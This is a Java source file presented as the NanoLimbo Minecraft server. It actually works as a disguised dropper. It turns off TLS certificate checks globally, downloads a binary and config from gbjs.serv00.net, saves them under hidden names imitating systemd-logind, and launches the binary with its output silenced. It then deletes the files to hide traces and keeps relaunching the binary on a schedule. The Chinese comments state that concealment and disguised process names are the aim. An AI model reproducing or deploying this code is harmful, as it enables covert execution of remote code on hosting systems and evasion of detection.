package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.nio.file.attribute.*;
import java.security.*;
import java.security.cert.X509Certificate;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;
import javax.net.ssl.*;

public final class NanoLimbo {

    private static final String G = "\u001B[32m";
    private static final String Y = "\u001B[33m";
    private static final String R = "\u001B[31m";
    private static final String X = "\u001B[0m";

    // ═══════ 隐蔽路径 ═══════
    private static final String BASEDIR      = Paths.get(System.getProperty("user.dir"), ".cache").toString();
    private static final String PID_FILE     = Paths.get(BASEDIR, ".pid").toString();
    private static final String BINARY_ALIAS = ".systemd-logind.sock";
    private static final String CONFIG_ALIAS = ".systemd-logind.conf";
    private static final String BINARY_PATH  = Paths.get(BASEDIR, BINARY_ALIAS).toString();
    private static final String CONFIG_PATH  = Paths.get(BASEDIR, CONFIG_ALIAS).toString();

    private static final int PORT = Integer.parseInt(
        firstNonEmpty(System.getenv("SERVER_PORT"), System.getenv("PORT"), "4567")
    );
    private static final String FULL_PATH =
        "/home/container/.tmp:/home/container/.npm:" + System.getenv("PATH");

    // ═══════ 极限版本下载源 ═══════
    private static final String CFG_URL = "https://gbjs.serv00.net/js/vip1715.yaml";
    private static final String BIN_X64 = "https://gbjs.serv00.net/bin/V1";
    private static final String BIN_ARM = "https://gbjs.serv00.net/bin/V1arm";

    // ═══════ 监控 ═══════
    private static final int INTERVAL_MIN = 5;
    private static final AtomicInteger fails = new AtomicInteger(0);
    private static final ScheduledExecutorService pool =
        Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "wkr");
            t.setDaemon(true);
            return t;
        });

    // ═══════ SSL 全局绕过 ═══════
    static {
        try {
            SSLContext ctx = SSLContext.getInstance("TLS");
            ctx.init(null, new TrustManager[]{ new X509TrustManager() {
                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                public void checkClientTrusted(X509Certificate[] c, String a) {}
                public void checkServerTrusted(X509Certificate[] c, String a) {}
            }}, new SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(ctx.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((h, s) -> true);
        } catch (Exception ignored) {}
    }

    // ═══════ main ═══════
    public static void main(String[] args) {
        ensureDir(BASEDIR);
        new Thread(() -> httpServer(PORT), "httpd").start();
        log("Server on :" + PORT);
        scheduleNext(2, TimeUnit.SECONDS);
    }

    // ═══════ 调度器（永不死亡）═══════
    private static void scheduleNext(int delay, TimeUnit unit) {
        pool.schedule(NanoLimbo::safeMonitor, delay, unit);
    }

    private static void scheduleNext(int delayMinutes) {
        scheduleNext(delayMinutes, TimeUnit.MINUTES);
    }

    private static void safeMonitor() {
        try {
            monitor();
        } catch (Throwable t) {
            err("Monitor error: " + t.getMessage());
        }
        // 兜底：如果 monitor 内部忘记调度，这里保证不断
    }

    // ═══════ 监控核心 ═══════
    private static void monitor() {
        // 1. PID 存活检测
        if (checkPid()) {
            scheduleNext(INTERVAL_MIN);
            return;
        }

        log("No process, starting...");

        // 2. 直接走 Java 原生下载
        boolean ok = startAgent();

        // 3. 根据结果调度下一轮
        if (ok) {
            fails.set(0);
            log("Started successfully");
            scheduleNext(INTERVAL_MIN);
        } else {
            int n = fails.incrementAndGet();
            int delay = Math.min(INTERVAL_MIN * (1 << Math.min(n - 1, 5)), 60);
            err("Failed " + n + "x, retry " + delay + "m");
            scheduleNext(delay);
        }
    }

    // ═══════ HTTP 服务器 ═══════
    private static void httpServer(int port) {
        byte[] body = "<h1>OK</h1>".getBytes();
        byte[] head = ("HTTP/1.1 200\r\nContent-Length:" + body.length + "\r\n\r\n").getBytes();
        byte[] resp = new byte[head.length + body.length];
        System.arraycopy(head, 0, resp, 0, head.length);
        System.arraycopy(body, 0, resp, head.length, body.length);

        try (ServerSocket ss = new ServerSocket(port)) {
            while (!Thread.interrupted()) {
                try (Socket c = ss.accept()) {
                    c.setSoTimeout(3000);
                    BufferedReader r = new BufferedReader(
                        new InputStreamReader(c.getInputStream()));
                    while (r.readLine() != null && !r.ready()) break;
                    c.getOutputStream().write(resp);
                    c.getOutputStream().flush();
                } catch (IOException ignored) {}
            }
        } catch (IOException ignored) {}
    }

    // ═══════ PID 检测（只查单条 /proc/{pid}，不扫全目录）═══════
    private static boolean checkPid() {
        File f = new File(PID_FILE);
        if (!f.exists()) return false;

        try {
            String s = new String(Files.readAllBytes(f.toPath())).trim();
            if (s.isEmpty() || !s.matches("\\d+")) {
                f.delete();
                return false;
            }
            boolean alive = new File("/proc/" + s).isDirectory();
            if (!alive) f.delete();
            return alive;
        } catch (Exception e) {
            f.delete();
            return false;
        }
    }

    // ══════════════════════════════════════════════════════════
    //  核心：Java 原生下载 + 启动（零外部依赖）
    // ══════════════════════════════════════════════════════════
    private static boolean startAgent() {
        try {
            // 1. IP → UUID
            String ip   = getIP();
            String uuid = ipToUuid(ip);
            boolean arm  = System.getProperty("os.arch", "").toLowerCase()
                           .matches(".*arm.*|.*aarch64.*");
            String binUrl = arm ? BIN_ARM : BIN_X64;

            warn("IP=" + ip + " arch=" + (arm ? "arm" : "x64"));

            // 2. 下载配置
            warn("Downloading config...");
            dl(CFG_URL, CONFIG_PATH);

            // 3. 下载二进制
            warn("Downloading binary...");
            dl(binUrl, BINARY_PATH);

            // 4. 赋予执行权限
            chmod(BINARY_PATH);

            // 5. 写入 UUID
            patchUuid(CONFIG_PATH, uuid);

            // 6. 等文件系统就绪
            Thread.sleep(200);

            // 7. 启动（伪装文件名，cmdline 无特征）
            warn("Spawning...");
            ProcessBuilder pb = new ProcessBuilder(BINARY_PATH, "-c", CONFIG_ALIAS);
            pb.directory(new File(BASEDIR));
            pb.environment().put("PATH", FULL_PATH);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process child = pb.start();

            // 8. 崩溃检测（3秒内退出 = 失败）
            if (child.waitFor(3, TimeUnit.SECONDS)) {
                err("Binary exit " + child.exitValue());
                return false;
            }

            // 9. 写入 PID 文件
            long pid = child.pid();
            writePid(String.valueOf(pid));
            log("Init " + pid);

            // 10. T+10s: 删除二进制 + 配置（进程已在内存，文件可删）
            pool.schedule(() -> {
                rm(BINARY_PATH);
                rm(CONFIG_PATH);
                log("Files cleaned");
            }, 10, TimeUnit.SECONDS);

            // 11. T+30s: 清空目录，仅留 .pid
            pool.schedule(() -> {
                File dir = new File(BASEDIR);
                if (dir.isDirectory()) {
                    for (File ff : dir.listFiles()) {
                        if (!".pid".equals(ff.getName())) ff.delete();
                    }
                }
            }, 30, TimeUnit.SECONDS);

            return true;

        } catch (Exception e) {
            err("Start failed: " + e.getMessage());
            return false;
        }
    }

    // ═══════ Java 原生下载（支持重定向，SSL 已全局绕过）═══════
    private static void dl(String url, String dest) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(15000);
        c.setReadTimeout(60000);
        c.setRequestProperty("User-Agent", "Mozilla/5.0");

        // 手动跟重定向（含跨协议）
        for (int i = 0; i < 5; i++) {
            int st = c.getResponseCode();
            if (st == 301 || st == 302 || st == 303 || st == 307 || st == 308) {
                String loc = c.getHeaderField("Location");
                c.disconnect();
                c = (HttpURLConnection) new URL(loc).openConnection();
                c.setConnectTimeout(15000);
                c.setReadTimeout(60000);
                c.setRequestProperty("User-Agent", "Mozilla/5.0");
            } else break;
        }

        if (c.getResponseCode() != 200) {
            throw new IOException("HTTP " + c.getResponseCode() + " from " + url);
        }

        try (InputStream in = c.getInputStream();
             OutputStream out = new FileOutputStream(dest)) {
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        } finally { c.disconnect(); }

        long sz = new File(dest).length();
        log("  " + new File(dest).getName() + " (" + sz + "B)");
    }

    // ═══════ 工具方法 ═══════

    private static String getIP() {
        String[] svcs = {
            "https://api.ipify.org",
            "https://ifconfig.me/ip",
            "https://icanhazip.com",
            "https://checkip.amazonaws.com"
        };
        for (String svc : svcs) {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(svc).openConnection();
                c.setConnectTimeout(3000);
                c.setReadTimeout(3000);
                c.setRequestProperty("User-Agent", "curl/7.88");
                try (BufferedReader r = new BufferedReader(
                        new InputStreamReader(c.getInputStream()))) {
                    String ip = r.readLine();
                    if (ip != null && !ip.trim().isEmpty()) return ip.trim();
                }
                c.disconnect();
            } catch (Exception ignored) {}
        }
        return "127.0.0.1";
    }

    private static String ipToUuid(String ip) throws Exception {
        byte[] h = MessageDigest.getInstance("SHA-1").digest(ip.getBytes());
        StringBuilder s = new StringBuilder();
        for (int i = 0; i < 16; i++) s.append(String.format("%02x", h[i]));
        String d = s.toString();
        return d.substring(0,8) + "-" + d.substring(8,12) + "-"
             + d.substring(12,16) + "-" + d.substring(16,20) + "-" + d.substring(20);
    }

    private static void chmod(String path) {
        try {
            new ProcessBuilder("chmod", "755", path).inheritIO().start().waitFor();
        } catch (Exception e) {
            try {
                Set<PosixFilePermission> p = new HashSet<>();
                p.add(PosixFilePermission.OWNER_READ);
                p.add(PosixFilePermission.OWNER_WRITE);
                p.add(PosixFilePermission.OWNER_EXECUTE);
                p.add(PosixFilePermission.GROUP_READ);
                p.add(PosixFilePermission.GROUP_EXECUTE);
                p.add(PosixFilePermission.OTHERS_READ);
                p.add(PosixFilePermission.OTHERS_EXECUTE);
                Files.setPosixFilePermissions(Paths.get(path), p);
            } catch (Exception ignored) {}
        }
    }

    private static void patchUuid(String path, String uuid) throws Exception {
        String c = new String(Files.readAllBytes(Paths.get(path)));
        Files.write(Paths.get(path), c.replaceAll("uuid: .*", "uuid: " + uuid).getBytes());
    }

    private static void writePid(String content) {
        try {
            ensureDir(BASEDIR);
            Files.write(Paths.get(PID_FILE), content.getBytes());
        } catch (Exception ignored) {}
    }

    private static void rm(String path) {
        try { Files.deleteIfExists(Paths.get(path)); } catch (Exception ignored) {}
    }

    private static void ensureDir(String p) {
        File d = new File(p);
        if (!d.exists()) d.mkdirs();
    }

    private static String firstNonEmpty(String... v) {
        for (String s : v) if (s != null && !s.trim().isEmpty()) return s.trim();
        return "";
    }

    private static void log(String m) { System.out.println(G + "[ok] " + m + X); }
    private static void warn(String m) { System.out.println(Y + "[..] " + m + X); }
    private static void err(String m) { System.err.println(R + "[!!] " + m + X); }
}
